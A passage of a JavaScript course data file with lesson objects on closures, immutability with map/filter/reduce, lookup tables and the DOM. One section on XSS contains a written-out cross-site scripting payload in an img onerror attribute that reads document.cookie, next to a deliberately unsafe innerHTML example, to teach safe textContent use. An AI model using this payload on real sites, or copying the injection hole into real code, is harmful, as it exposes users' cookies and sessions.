        "  let called = false;",
        "  let storedResult;",
        "  return (...args) => {",
        "    if (!called) {",
        "      called = true;",
        "      storedResult = fn(...args);",
        "    }",
        "    return storedResult;             // sticky first result",
        "  };",
        "}",
        "",
        "function debounce(fn, ms) {",
        "  let timerId;",
        "  return (...args) => {",
        "    clearTimeout(timerId);",
        "    timerId = setTimeout(() => fn(...args), ms);",
        "  };",
        "}",
        "",
        "// ——— compose: a burst of deposits collapses into one ———",
        "const account = createAccount(0);",
        "const logExpense = debounce((amount) => {",
        "  account.deposit(amount);",
        "  console.log(`deposited ${amount} → balance ${account.balance()}`);",
        "}, 250);",
        "",
        "logExpense(10); logExpense(20); logExpense(30); // burst!",
        "// one log after ~250ms: \"deposited 30 → balance 30\"",
        "",
        "// invariants you just built with nothing but scope:",
        "account.balance;      // the FUNCTION (the only door)",
        "account.balance();    // 30",
        "// account.balance = 999999 → replaces the method, not the luggage;",
        "// the real balance variable was never reachable at all.",
      ].join("\n"),
    },
    quiz: [
      {
        q: "A closure is…",
        options: ["A function plus the scope it captured when created", "A function without parameters", "A loop that never ends", "A private class field"],
        answer: 0,
        explain: "The function packs its defining scope into a backpack and carries it forever. Every call unzips that backpack — not the scope where the call happens.",
      },
      {
        q: "Two counters from the same makeCounter factory stay independent because…",
        options: ["Each factory call runs the body fresh, capturing a fresh set of variables", "JavaScript clones functions automatically", "They're stored in different memory heaps", "const prevents sharing"],
        answer: 0,
        explain: "makeCounter() runs its body each call: a new n, a new backpack. The returned methods close over THAT run's variables. Isolation falls out of scope rules — no machinery needed.",
      },
      {
        q: "The var loop prints 3,3,3 because…",
        options: ["var creates ONE function-scoped i; all callbacks read it after the loop ends", "setTimeout is broken with loops", "var callbacks run synchronously", "i is copied by value into each callback"],
        answer: 0,
        explain: "Closures capture variables, not values. One shared i + deferred reads = everyone sees the final 3. let creates a per-iteration binding, so each callback captures its own.",
      },
      {
        q: "Arrows differ from function expressions by…",
        options: ["Having no own this (they inherit it) and no arguments object", "Being unable to return values", "Not being values", "Being hoisted"],
        answer: 0,
        explain: "Arrows inherit this from their defining scope — the fix for callback bugs — and take rest parameters instead of arguments. They are values and they are NOT hoisted.",
      },
      {
        q: "In debounce, clearTimeout on every call is what…",
        options: ["Ensures only the last call of a burst fires, after the pause", "Makes it faster", "Prevents memory growth only", "Restarts the loop"],
        answer: 0,
        explain: "Each call kills the pending timer and schedules a new one, so the function only runs after ms of silence. The timer id lives in the closure — private, persistent state.",
      },
      {
        q: "Reading a let before its declaration throws because…",
        options: ["It sits in the temporal dead zone until execution reaches the line", "let isn't hoisted at all", "const is faster", "Blocks don't support let"],
        answer: 0,
        explain: "let/const ARE hoisted (registered) but locked until their line — a deliberate guard against var's undefined-shell surprises.",
      },
    ],
    flashcards: [
      { front: "Closure", back: "Function + the scope it captured at creation. Calls unpack the captured scope, not the calling scope. 'A function with a backpack.'" },
      { front: "Scope lookup", back: "Outward only: local → enclosing → … → global, first hit wins. Inner sees outer; outer never sees inner." },
      { front: "let/const vs var", back: "let/const: block-scoped, TDZ until their line — the default. var: function-scoped, hoists as undefined — legacy you recognize, not write." },
      { front: "Hoisting", back: "Declarations register before execution: function declarations rise complete; var as an undefined shell; let/const locked in the TDZ." },
      { front: "Arrow functions", back: "No own this (inherited from defining scope), no arguments object (use ...rest), not hoisted. The right default for callbacks." },
      { front: "Factory function", back: "A function returning a function; each call gets fresh captured state → private, isolated instances with zero class syntax." },
      { front: "Debounce", back: "Closure over a timer id: each call clears the pending timer and schedules a new one, so fn fires only after ms of silence." },
      { front: "The 3-3-3 bug", back: "var shares one loop variable across all callbacks; closures read it later, after the loop. let fixes it with a binding per iteration." },
    ],
    recap: [
      "Functions are values: declare, express, arrow — pass them, return them, store them.",
      "Scope looks outward only; const by default, let for genuine change, var as recognized legacy.",
      "Hoisting: declarations rise, let/const wait in the TDZ, var rises hollow.",
      "A closure is a function plus its packed scope — private state and isolation for free.",
      "Debounce and once are six-line closures you will ship forever; stale values die when you ask 'which backpack, packed when?'",
    ],
    references: [
      { label: "MDN — Closures", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Closures" },
      { label: "MDN — Arrow functions", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions" },
      { label: "MDN — let", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let" },
      { label: "MDN — var (legacy)", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var" },
      { label: "javascript.info — Variable scope, closure", url: "https://javascript.info/closure" },
    ],
    nextBridge:
      "Your functions now carry state and timing discipline. Next: arrays and objects at professional depth — map/filter/reduce as the declarative core, the immutability discipline React will demand, and Object.freeze/spread patterns that keep shared houses from surprising you.",
  },
];

export const LESSON_CONTENT_P2B: LessonContent[] = [
  {
    id: "p02-l3",
    phaseId: "p02",
    title: "Arrays, Objects & Immutability",
    level: "Foundation",
    minutes: 40,
    summary:
      "map, filter, and reduce are the declarative core of professional JavaScript: describe the transformation, let the engine run the loop. This lesson installs the trio, the non-mutating toolkit (spread, slice, toSorted/toReversed/with), lookup tables that replace switch pyramids — and the immutability discipline that React, TanStack Query, and memoization will later demand by law.",
    prerequisites: ["p02-l2 — functions, scope, and closures"],
    objectives: [
      "Rewrite counting/collecting/summarizing loops as filter → map → reduce pipelines of pure functions.",
      "Distinguish methods that mutate (push, sort, splice) from those that return copies (map, filter, slice, concat, toSorted).",
      "Update arrays and objects immutably: spread for shallow levels, structuredClone when depth demands it.",
      "Explain why reference identity (===) is the currency of change detection — and why mutation bankrupts it.",
      "Replace status-switch pyramids with lookup tables via Object.fromEntries and Object.hasOwn.",
      "Choose Map over plain objects when keys aren't strings or you need size/iteration guarantees.",
    ],
    simple:
      "A for loop tells the computer HOW: 'start at zero, check the end, step one, and while you're there…' — every bookkeeping detail is your problem. map/filter/reduce tell it WHAT: 'keep these, transform those, fold the rest into a total' — the engine handles the mechanics, and your code reads like the sentence you'd say out loud. The price of admission is one rule: transformations create new values instead of rewriting old ones. Keep that rule and the whole modern frontend stack (which detects changes by comparing old reference to new) works; break it and every bug is a mystery.",
    why:
      "You are learning this before React on purpose. React re-renders when state references change; TanStack Query compares data by identity; useMemo/useCallback memoize on identity; toSorted/toReversed (Baseline 2023) exist precisely because mutating methods caused a decade of shared-state bugs. Developers who arrive at Phase 4 still writing push-and-pray spend weeks confused by 'my state updated but nothing re-rendered'. The fix is always the same lesson they skipped — this one.",
    mentalModel: {
      title: "The assembly line",
      body: "Picture a factory floor. Raw parts arrive (the original array) and ride a conveyor through stations: the filter station pulls off the defective pieces, the map station reshapes each survivor into a new part, the reduce station melts the whole batch into one ingot (a sum, a lookup, a sentence). Crucially, the original crate of parts sits untouched in the corner — the line only ever produces NEW things. Because the crate never changes, the warehouse can instantly tell 'did a new crate arrive?' just by checking whether the pallet's ID tag is different. Mutation is the worker who sneaks back and files down parts in the original crate: now nobody can tell what changed, when, or who did it. Immutability isn't purity for its own sake — it's the ID-tag system that makes change detectable.",
    },
    sections: [
      {
        heading: "The declarative trio — filter, map, reduce",
        body: [
          "Three methods cover nearly every data transformation: filter keeps elements that pass a test (returns an array, same shape), map transforms each element into something new (returns an array, possibly new shape), reduce folds everything into one accumulated value (returns anything: a number, an object, a string, even an array). The discipline that makes them sing: the callback must be a pure function — same input, same output, no side effects, no reaching outside to mutate.",
          "The reading pattern is a pipeline: data flows left to right through stages, each stage's output feeding the next. orders.filter(inStock).map(toLabel).join(', ') says the whole story in one line. When a pipeline grows past three stages or the intermediate shapes get noisy, extract named steps — const available = orders.filter(isAvailable) — because a named stage is self-documenting and unit-testable.",
        ],
        code: [
          {
            file: "trio.js — the same job, told two ways",
            lang: "js",
            code: [
              "const orders = [",
              "  { id: \"A-101\", cents: 1999, status: \"paid\" },",
              "  { id: \"A-102\", cents: 450,  status: \"refund\" },",
              "  { id: \"A-103\", cents: 3200, status: \"paid\" },",
              "  { id: \"A-104\", cents: 899,  status: \"paid\" },",
              "];",
              "",
              "// the imperative telling:",
              "let total = 0;",
              "for (let i = 0; i < orders.length; i++) {",
              "  if (orders[i].status === \"paid\") total += orders[i].cents;",
              "}",
              "",
              "// the declarative telling — one sentence:",
              "const paidTotal = orders",
              "  .filter((o) => o.status === \"paid\")   // keep the paid ones",
              "  .reduce((sum, o) => sum + o.cents, 0); // fold into a total",
              "// 6098 — and `orders` is untouched",
              "",
              "// map reshapes; chain stages like an assembly line:",
              "const receipt = orders",
              "  .filter((o) => o.status === \"paid\")",
              "  .map((o) => `${o.id}: $${(o.cents / 100).toFixed(2)}`)",
              "  .join(\" | \");",
              "// \"A-101: $19.99 | A-103: $32.00 | A-104: $8.99\"",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Which methods mutate? The line you must know cold",
        body: [
          "Split the array API into two families. Mutators rewrite the receiver and return leftovers: push, pop, shift, unshift, splice, sort, reverse, fill. Copy-makers leave the receiver pristine and return something new: map, filter, slice, concat, toSorted, toReversed, with, flatMap, and spread [...arr]. The two historical traitors are sort and reverse — they look innocent and mutate in place, which is why the non-mutating twins toSorted/toReversed (Baseline 2023, safe in every current browser and Node baseline) now exist.",
          "Practical reflex: any time you're tempted to mutate, ask what the NEW value should be and construct it. Add → [...list, item]. Remove → list.filter(x => x.id !== id). Replace/update → list.map(x => x.id === id ? {...x, done: true} : x). Reorder → [...list].sort(...) or list.toSorted(...). Those four recipes cover 95% of state updates you will ever write — in this course and after it.",
        ],
        code: [
          {
            file: "mutators-vs-copies.js",
            lang: "js",
            code: [
              "const nums = [3, 1, 2];",
              "",
              "const sortedTrap = nums.sort((a, b) => a - b);",
              "sortedTrap === nums;  // true — nums itself is now [1, 2, 3]!",
              "",
              "const nums2 = [3, 1, 2];",
              "const safe = nums2.toSorted((a, b) => a - b); // [1, 2, 3]",
              "nums2;              // still [3, 1, 2] — untouched",
              "safe === nums2;     // false — a NEW array",
              "",
              "// the four state-update recipes:",
              "const add    = (list, item) => [...list, item];",
              "const remove = (list, id)   => list.filter((x) => x.id !== id);",
              "const update = (list, id, patch) =>",
              "  list.map((x) => (x.id === id ? { ...x, ...patch } : x));",
              "const reorder = (list) => list.toSorted((a, b) => a.rank - b.rank);",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Objects — spread, destructuring, computed keys",
        body: [
          "Spread copies an object's own enumerable properties into a new shell: {...user, plan: 'gold'} builds an updated user while the original keeps breathing — this is the object version of the update recipe. Destructuring unpacks with defaults and renames (const { name, plan = 'free', id: userId } = user), and rest gathers the leftovers (const { password, ...safeUser } = user — the classic 'strip secrets before sending' move).",
          "Computed keys ({ [status]: handler }) plus Object.fromEntries(Object.entries(config).map(...)) turn data INTO structure — configuration tables, translation maps, API responses becoming lookup objects. Guard existence with Object.hasOwn(obj, key), which — unlike the in operator — ignores inherited properties. Two honest limits of spread: it is shallow (nested objects are still shared addresses) and it drops non-enumerables; when depth matters, reach for structuredClone or rebuild level by level deliberately.",
        ],
        code: [
          {
            file: "objects-toolkit.js",
            lang: "js",
            code: [
              "const user = { id: 7, name: \"Ada\", plan: \"free\", password: \"s3cret\" };",
              "",
              "// update without touching the original:",
              "const upgraded = { ...user, plan: \"gold\" };",
              "user.plan;        // \"free\" — pristine",
              "",
              "// strip secrets with destructuring rest:",
              "const { password, ...safeUser } = user;",
              "// safeUser → { id, name, plan } — password never leaves the server",
              "",
              "// data → structure: status codes to messages",
              "const pairs = [[404, \"Not found\"], [429, \"Too many requests\"]];",
              "const messages = Object.fromEntries(pairs);",
              "messages[429];    // \"Too many requests\"",
              "",
              "Object.hasOwn(messages, 404);      // true",
              "Object.hasOwn(messages, \"toString\"); // false — inherited keys excluded",
            ].join("\n"),
            caption: "The destructure-and-rest strip ({ password, ...safeUser }) reappears in Phase 12 as NestJS serialization discipline — same shape, higher stakes.",
          },
        ],
      },
      {
        heading: "Immutability — update, don't mutate (the law, learned early)",
        body: [
          "The rule in one sentence: treat every value you receive as read-only and produce NEW values instead of editing. Two traps survive the beginner stage. One: shallow copies share depth — [...todos] protects the array but todos[1] is still the same object, so todos[1].done = true rewrites 'history' anyway; rebuild each level you touch ({...todo, done: true}) or structuredClone the whole thing when updates are deep. Two: mutation looks efficient ('why copy?') but buys you undetectable change — the lab below shows the snapshot panel going stale in real time.",
          "Why the stack cares: React re-renders when a state reference changes; hand it the same array with edited contents and it sees === true and renders nothing. useMemo/useCallback memoize on identity. TanStack Query's structural sharing hands components stable references for the parts that didn't change — impossible if you mutate shared objects. Learn the four recipes plus the shallow-depth caveat and Phase 4–6 become pattern recognition instead of séances.",
        ],
        code: [
          {
            file: "depth-trap.js — shallow copies lie about depth",
            lang: "js",
            code: [
              "const state = {",
              "  todos: [{ id: 1, title: \"Ship\", done: false }],",
              "};",
              "",
              "const next = { ...state, todos: [...state.todos] }; // two fresh shells…",
              "next.todos[0].done = true;   // …but the ITEM is still shared!",
              "state.todos[0].done;         // true — the 'original' lied",
              "",
              "// rebuild every level you touch:",
              "const right = {",
              "  ...state,",
              "  todos: state.todos.map((t) =>",
              "    t.id === 1 ? { ...t, done: true } : t",
              "  ),",
              "};",
              "state.todos[0].done;  // false — truly untouched",
              "",
              "// or, for genuinely deep edits: structuredClone(state)",
            ].join("\n"),
          },
        ],
        demo: "immutable-lab",
      },
      {
        heading: "Lookup tables beat pyramids — and Map for grown-up keys",
        body: [
          "A switch over statuses and an if/else-if ladder are the same pyramid: every new case edits logic instead of data. The lookup table inverts it — a plain object (or Map) holding status → behavior, read with messages[status] ?? fallback. New cases become one data row; exhaustiveness can even be asserted at construction. This exact shape becomes NestJS status-transition guards in Phase 42 and error-code maps in Phase 19's API client.",
          "Plain objects are great lookups when keys are strings you control. Reach for Map when keys are objects/Dates/numbers-that-must-stay-numbers (object keys get stringified and coerced), when you need .size, when you iterate insertion order deliberately, or when keys come from users (Object.prototype pollution: userKey = 'constructor' breaks plain lookups in subtle ways). Map.get/set/has plus spread back to entries keeps both worlds fluent.",
        ],
        code: [
          {
            file: "lookups.js",
            lang: "js",
            code: [
              "// pyramid:",
              "function label(s) {",
              "  if (s === \"open\") return \"In progress\";",
              "  if (s === \"blocked\") return \"Waiting on someone\";",
              "  if (s === \"done\") return \"Shipped\";",
              "  return \"Unknown\";",
              "}",
              "",
              "// table — adding a status is one line of data:",
              "const LABELS = {",
              "  open: \"In progress\",",
              "  blocked: \"Waiting on someone\",",
              "  done: \"Shipped\",",
              "};",
              "const label2 = (s) => LABELS[s] ?? \"Unknown\";",
              "",
              "// Map territory: non-string keys, real size, safe iteration",
              "const byUser = new Map();",
              "byUser.set({ id: 7 }, 3);      // object key survives as-is",
              "byUser.size;                    // 1 — objects make you count by hand",
            ].join("\n"),
          },
        ],
      },
    ],
    mistake: {
      title: "The sorting traitor",
      wrong: [
        "function showTopScores(players) {",
        "  const top = players.sort((a, b) => b.score - a.score);",
        "  render(top);",
        "}",
        "// players.sort() rearranged the ORIGINAL array in place.",
        "// Every other view of `players` — the leaderboard's 'original",
        "// order' tab, a chart, the undo history — is now silently",
        "// reordered too. The bug reports will not mention sorting.",
      ].join("\n"),
      right: [
        "function showTopScores(players) {",
        "  const top = players.toSorted((a, b) => b.score - a.score);",
        "  render(top); // original order preserved for everyone else",
        "}",
        "// pre-Baseline-2023 environments: [...players].sort(…)",
        "// — the spread copies first, then the copy takes the hit.",
      ].join("\n"),
      explain:
        "sort() and reverse() are the two 'copy-looking' methods that mutate the receiver and return it — so const top = players.sort(...) reads like a transformation but is an ambush. The non-mutating twins (toSorted/toReversed, Baseline 2023) or a spread-first copy keep shared data honest. Audit every .sort in legacy code for this exact bug.",
    },
    tryIt: [
      "Take any counting loop you've ever written (or the imperative total in section one) and rewrite it as a filter/map/reduce pipeline. Time both readings aloud — which one explains itself?",
      "In the lab above, run todos.push on the mutating side and read the snapshot badges. Then run [...todos, item] on the immutable side. Say the difference out loud using the words 'identity' and 'reference'.",
      "Prove the depth trap: build state = { todos: [{…}] }, shallow-copy it two levels with spreads, mutate a nested field, and inspect the original. Then fix it with map+spread and re-verify.",
      "Convert this pyramid to a table: function fee(t) { if (t==='gold') return 0; if (t==='silver') return 5; if (t==='bronze') return 10; return 15; } — then add a 'platinum' tier by editing DATA only.",
      "Build the safeUser strip from section three for an object with at least four fields including one secret, and log both objects. Where in this course's architecture does that exact move recur?",
    ],
    challenge: {
      prompt:
        "Build an 'inventory report' module from this data — every step must leave products untouched (verify by logging it before and after):\n\nconst products = [\n  { sku: 'KB-01', name: 'Mechanical keyboard', cents: 12999, stock: 14 },\n  { sku: 'MS-02', name: 'Ergo mouse', cents: 7999, stock: 0 },\n  { sku: 'MN-03', name: '4K monitor', cents: 34999, stock: 3 },\n  { sku: 'CB-04', name: 'USB-C cable', cents: 1499, stock: 120 },\n];\n\nDeliver: (1) inStockNames — names of products with stock > 0, via filter + map; (2) inventoryValueCents — total value (cents × stock) of in-stock items, via reduce (integer cents!); (3) bySku — a lookup object built with Object.fromEntries; (4) raisePrice(products, sku, pct) returning a NEW array with that product's cents increased by pct% (Math.round), using map + object spread, and proving with === that the original array and the untouched products are reference-identical to before.",
      hints: [
        "Pipeline stages read best named: const inStock = products.filter(p => p.stock > 0) — then map it for names and reuse it for the value reduce.",
        "Inventory value reduce: the accumulator starts at 0 and adds p.cents * p.stock. No division anywhere — the cents stay integers to the end.",
        "raisePrice: products.map(p => p.sku === sku ? { ...p, cents: Math.round(p.cents * (1 + pct/100)) } : p). After calling it, assert products === beforeRef and products[0] === beforeFirst — BOTH must be true for untouched products.",
      ],
      solution: [
        "const products = [",
        "  { sku: \"KB-01\", name: \"Mechanical keyboard\", cents: 12999, stock: 14 },",
        "  { sku: \"MS-02\", name: \"Ergo mouse\", cents: 7999, stock: 0 },",
        "  { sku: \"MN-03\", name: \"4K monitor\", cents: 34999, stock: 3 },",
        "  { sku: \"CB-04\", name: \"USB-C cable\", cents: 1499, stock: 120 },",
        "];",
        "",
        "// (1) names of in-stock products",
        "const inStock = products.filter((p) => p.stock > 0);",
        "const inStockNames = inStock.map((p) => p.name);",
        "// [\"Mechanical keyboard\", \"4K monitor\", \"USB-C cable\"]",
        "",
        "// (2) total value in integer cents — no floats ever touch it",
        "const inventoryValueCents = inStock.reduce(",
        "  (sum, p) => sum + p.cents * p.stock,",
        "  0",
        "); // 12999*14 + 34999*3 + 1499*120 = 466971",
        "const display = `$${(inventoryValueCents / 100).toFixed(2)}`; // \"$4669.71\"",
        "",
        "// (3) data → structure: sku lookup",
        "const bySku = Object.fromEntries(products.map((p) => [p.sku, p]));",
        "bySku[\"MN-03\"].name; // \"4K monitor\" — O(1) instead of a find() scan",
        "",
        "// (4) immutable price raise",
        "function raisePrice(list, sku, pct) {",
        "  return list.map((p) =>",
        "    p.sku === sku",
        "      ? { ...p, cents: Math.round(p.cents * (1 + pct / 100)) }",
        "      : p // untouched products keep their IDENTITY (structural sharing)",
        "  );",
        "}",
        "",
        "// ——— the proof is the point ———",
        "const beforeRef = products;",
        "const beforeFirst = products[0];",
        "const raised = raisePrice(products, \"KB-01\", 10);",
        "",
        "raised === products;            // false — new array",
        "raised[0] === products[0];      // false — KB-01 was rebuilt",
        "raised[0].cents;                // 14299 (12999 × 1.10, rounded)",
        "products === beforeRef;         // true — original array untouched",
        "products[0] === beforeFirst;    // true — untouched item shares identity",
        "raised[3] === products[3];      // true — untouched item passed through",
        "",
        "// Three identity checks pass: the transformation is detectable",
        "// (new array, new changed item) yet cheap (shared untouched items).",
        "// That is the exact contract React's change detection expects.",
      ].join("\n"),
    },
    quiz: [
      {
        q: "Which expression returns a NEW array without touching the original?",
        options: ["arr.toSorted(cmp)", "arr.sort(cmp)", "arr.push(x)", "arr.splice(0, 1)"],
        answer: 0,
        explain: "toSorted/toReversed/with (Baseline 2023) are the non-mutating twins. sort/reverse/splice/push all rewrite the receiver — the classic shared-state ambush.",
      },
      {
        q: "reduce is the right tool when…",
        options: ["Many elements must fold into one value (sum, lookup, sentence)", "Every element needs reshaping", "Some elements must be dropped", "The array must be reversed"],
        answer: 0,
        explain: "filter narrows (array→array), map reshapes (array→array), reduce folds (array→anything). Need an object or a total at the end? That's a fold.",
      },
      {
        q: "[...todos] protects the array, but todos[1].done = true still rewrites shared history because…",
        options: ["Spread is shallow — inner objects remain shared references", "Spread is asynchronous", "The copy is read-only", "Arrays can't be copied"],
        answer: 0,
        explain: "The copy holds the same inner addresses. Rebuild every level you touch ({...todo, done: true}) or structuredClone when edits run deep.",
      },
      {
        q: "Why does React care about immutability at all?",
        options: ["It detects changes by comparing references — mutation yields === true and no re-render", "Copying is faster than mutating", "JavaScript forbids mutation in strict mode", "Immutability improves SEO"],
        answer: 0,
        explain: "setState with the same reference looks like 'nothing changed'. Produce new values and the identity check lights up — the same contract TanStack Query and memoization use.",
      },
      {
        q: "Object.fromEntries(Object.entries(x)) is the idiom for…",
        options: ["Turning key/value pairs into an object — data becoming structure", "Deep-cloning any object", "Freezing an object", "Sorting keys alphabetically"],
        answer: 0,
        explain: "entries → pairs, fromEntries → object. It powers lookup tables, config transforms, and the map-then-rebuild pattern over objects.",
      },
      {
        q: "Prefer Map over a plain object when…",
        options: ["Keys are non-strings, or you need .size / ordered iteration / safety from user-supplied keys", "The lookup is small", "You want JSON.stringify to work", "Keys are constants"],
        answer: 0,
        explain: "Object keys coerce to strings ('7' and 7 collide), prototype keys like 'constructor' can poison user-keyed lookups, and size is a manual count. Map fixes all three.",
      },
    ],
    flashcards: [
      { front: "filter / map / reduce", back: "Keep matching elements / reshape each element / fold all elements into one value. The declarative trio — pipelines of pure callbacks, originals untouched." },
      { front: "Mutators vs copy-makers", back: "push/pop/splice/sort/reverse mutate the receiver. map/filter/slice/concat/toSorted/toReversed/with/spread return new values. sort and reverse are the historical traitors." },
      { front: "Shallow copy", back: "A copy whose nested values are still shared references. [...list] or {...obj} protect one level; rebuild each level you touch, or structuredClone for depth." },
      { front: "The four update recipes", back: "Add: [...list, x]. Remove: list.filter(≠ id). Update: list.map(id ? {...x, patch} : x). Reorder: list.toSorted(cmp). Covers ~95% of state updates." },
      { front: "Reference identity", back: "=== between old and new references is how React/Query/memoization detect change. Mutation returns the same reference → 'nothing changed' → stale UI." },
      { front: "Lookup table", back: "Data over logic: const LABELS = { open: '…' }; LABELS[s] ?? fallback. New cases are data rows, not edited branches. Map when keys aren't safe strings." },
      { front: "Object.fromEntries / entries", back: "entries: object → [key, value] pairs. fromEntries: pairs → object. The bridge that turns data into structure (and back)." },
      { front: "structuredClone", back: "Built-in deep copy: new objects at every level. Handles Date/Map/nesting; can't clone functions or DOM nodes. The honest answer to deep updates you won't rebuild level-by-level." },
    ],
    recap: [
      "filter narrows, map reshapes, reduce folds — pipelines of pure callbacks replace bookkeeping loops.",
      "Know the mutator list by heart; toSorted/toReversed/with are the modern non-mutating twins.",
      "Spread is one level deep — rebuild every level you touch or structuredClone.",
      "Identity is the currency: new references make change detectable; mutation makes it invisible.",
      "Tables over pyramids; Map over objects when keys grow up.",
    ],
    references: [
      { label: "MDN — Array", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" },
      { label: "MDN — Array.prototype.toSorted()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/toSorted" },
      { label: "MDN — Spread syntax", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax" },
      { label: "MDN — Object.fromEntries()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries" },
      { label: "MDN — Map", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map" },
    ],
    nextBridge:
      "Your data now transforms cleanly and your updates are detectable. Next lesson connects this discipline to the page itself: the DOM as live objects, events and delegation, safe templating (your first XSS encounter), and the state→render loop — assembled into the vanilla Todo skeleton, your first cumulative milestone.",
  },
  {
    id: "p02-l4",
    phaseId: "p02",
    title: "The DOM, Events & Forms",
    level: "Foundation",
    minutes: 45,
    summary:
      "The DOM is your Phase 1 HTML, alive: every element is an object you can query, build, restyle, and listen to. This lesson installs querySelector discipline, safe node construction (textContent over innerHTML — your first XSS encounter), event bubbling and delegation, form wiring — and assembles all of it into the vanilla Todo skeleton: a state → render loop that is the exact pattern React later automates.",
    prerequisites: ["p02-l3 — arrays/objects/immutability", "p01-l2 — forms, labels & native validation", "p01-l1 — semantic HTML"],
    objectives: [
      "Query and traverse the live DOM with querySelector/All, closest, and classList — and know the NodeList is static.",
      "Build nodes with createElement/textContent and explain precisely why innerHTML + user data is an injection hole.",
      "Use addEventListener fluently: the event object, target vs currentTarget, preventDefault on submit.",
      "Apply event delegation (one listener + closest + data-attributes) so handlers survive re-renders.",
      "Read forms with FormData and wire submit through the validation gate from P01-L2.",
      "Structure a vanilla app as state + render() + action functions — the pattern every framework abstracts.",
    ],
    simple:
      "Everything you built with HTML in Phase 1 exists twice: once as the markup you wrote, and once as a tree of live JavaScript objects — the DOM — that the browser keeps in memory. You can grab any object (querySelector), change it (textContent, classList), build new ones (createElement), and attach reflexes (addEventListener) that fire when users click, type, or submit. A web app, stripped bare, is just three things: some state in variables, a render function that redraws the page from that state, and event handlers that change the state and call render again. React, at its core, is those three steps with the bookkeeping automated.",
    why:
      "Frameworks didn't end DOM work — they moved it. React's reconciler is doing querySelector-scale surgery for you; TanStack Query re-renders on data changes; every debugging session in Phase 4+ is really asking 'which handler changed which state and why didn't render show it?'. If you've never driven the DOM by hand, the framework's answers are magic. If you have, the framework is a relief. And the security stake is immediate: the moment you build UI from user input, innerHTML becomes an injection vector — the first of many trust boundaries this course makes you respect.",
    mentalModel: {
      title: "The marionette theater",
      body: "Your HTML is the stage set — scenery nailed down on opening night. The DOM is that same set rebuilt as marionettes, each with strings hanging up into JavaScript's hands: pull one to change a face (textContent), swap a costume (classList), attach a new puppet (createElement + append), or rig a tripwire that yanks a string when the audience touches it (addEventListener). The script you actually run all evening is tiny: read the scene (state), position every puppet (render), and when a tripwire fires, update the script and reposition (action → state → render). Puppeteers who yank strings randomly get tangled; the ones with a script can rebuild the whole show from its pages.",
    },
    sections: [
      {
        heading: "Querying — the DOM is objects all the way down",
        body: [
          "querySelector(css) returns the first match or null; querySelectorAll(css) returns a STATIC NodeList — a snapshot, not a live view, so elements added later won't appear in an old result. Every element object carries: textContent (its text), classList (add/remove/toggle — never className string-surgery), dataset (data-* attributes as camelCase properties), and value for form controls. Reading an element means a property; changing it means assignment or a classList call.",
          "Traversal is navigation: closest(selector) walks UP to the nearest ancestor match (the workhorse of delegation), while children and querySelector on an element search DOWN within it. null discipline matters: querying something optional chains into crashes, so guard with if (!el) return or optional access — the browser does not throw on a miss, it hands you null and waits for you to fall.",
        ],
        code: [
          {
            file: "query.js",
            lang: "js",
            code: [
              "const form = document.querySelector(\"#todo-form\"); // first match or null",
              "const rows = document.querySelectorAll(\"li.todo\"); // STATIC snapshot",
              "",
              "const title = document.querySelector(\"#title\");",
              "if (title) {                 // null discipline: a miss is null, not an error",
              "  title.textContent = \"Sprint 14\";",
              "  title.classList.add(\"loud\");   // class surgery via classList, not strings",
              "}",
              "",
              "// data-* round trip:",
              "// <li class=\"todo\" data-id=\"7\">…</li>",
              "const li = document.querySelector(\"li.todo\");",
              "li.dataset.id;               // \"7\" — always a STRING. Number() it.",
              "",
              "// walking up: from a clicked button to its owning row",
              "const row = someButton.closest(\"li.todo\");",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Building nodes safely — and your first XSS encounter",
        body: [
          "Two ways to put content on the page, one safe and one a loaded gun. Safe: createElement('li'), set li.textContent = userTitle, append into a parent — textContent treats everything as inert text, so a title like <img src=x onerror=steal()> renders as harmless characters. Loaded: el.innerHTML = '<li>' + userTitle + '</li>' — innerHTML PARSES its string as HTML, so the browser happily executes whatever markup the user smuggled in. That is cross-site scripting (XSS) in one line, and it is why 'never build HTML from user input' is a law, not a style preference.",
          "The discipline survives every framework: React escapes interpolated values for this exact reason; when it offers dangerouslySetInnerHTML, the name is the warning. In vanilla code: user data ALWAYS enters via textContent, setAttribute, or value — never via an HTML string. Static templates you fully authored are fine; the boundary is 'did any part of this string come from a user, a URL, or a database row a user wrote?'",
        ],
        code: [
          {
            file: "safe-nodes.js — the boundary that keeps scripts out",
            lang: "js",
            code: [
              "const evilTitle = '<img src=x onerror=\"alert(document.cookie)\">';",
              "",
              "// ✗ the hole: user text parsed AS markup",
              "list.innerHTML = `<li>${evilTitle}</li>`;",
              "// → the browser creates a real <img> and RUNS onerror.",
              "//   Cookies just left the building.",
              "",
              "// ✓ the wall: user text enters as TEXT",
              "const li = document.createElement(\"li\");",
              "li.textContent = evilTitle;   // renders as literal characters",
              "list.append(li);              // inert, ugly, and exactly right",
              "",
              "// structural attributes are fine; this is still safe:",
              "li.classList.add(\"todo\");",
              "li.dataset.id = String(todo.id);",
            ].join("\n"),
            caption: "Try the ✗ version in a scratch page with onerror=\"alert('XSS')\" — watching it fire once vaccinates you permanently.",
          },
        ],
      },
      {
        heading: "Events — listening, the event object, and the submit gate",
        body: [
          "addEventListener('click', handler) wires a reflex; the handler receives an Event object answering three questions: event.target (what was actually clicked — possibly a child), event.currentTarget (what the listener is attached to), and event.type. preventDefault() cancels the browser's default behavior — the move that turns a form's page-reloading submit into your code handling the data, and the same move for link navigation or context menus when you genuinely own the behavior.",
          "Form wiring connects straight back to P01-L2: attach ONE submit listener, call event.preventDefault() (the validation engine already blocked invalid data before you got here), read everything with new FormData(form), and Object.fromEntries to flatten. Keyboard support comes free with real <button>/<a> elements — another dividend of Phase 1's element discipline.",
        ],
        code: [
          {
            file: "events.js",
            lang: "js",
            code: [
